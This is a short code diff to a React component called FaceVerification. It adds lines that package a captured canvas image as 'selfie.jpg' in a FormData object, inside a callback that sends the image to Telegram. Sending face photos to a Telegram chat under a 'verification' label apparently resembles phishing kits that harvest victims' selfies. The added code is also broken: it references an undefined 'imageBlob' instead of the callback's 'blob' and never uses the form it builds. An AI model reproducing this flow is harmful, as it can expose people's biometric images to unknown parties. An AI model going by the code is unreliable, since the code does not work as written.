@@ -57,6 +57,10 @@ export default function FaceVerification() {
                 canvas.toBlob((blob) => {
                     // Now you have a blob that can be sent to Telegram
                     console.log("Image blob created");
+                    const formData = new FormData();
+    
+                    // Append the image as a file
+                    formData.append('photo', imageBlob, 'selfie.jpg');
                     
                     // Send the blob to Telegram
                     sendMessageToTelegram (blob);
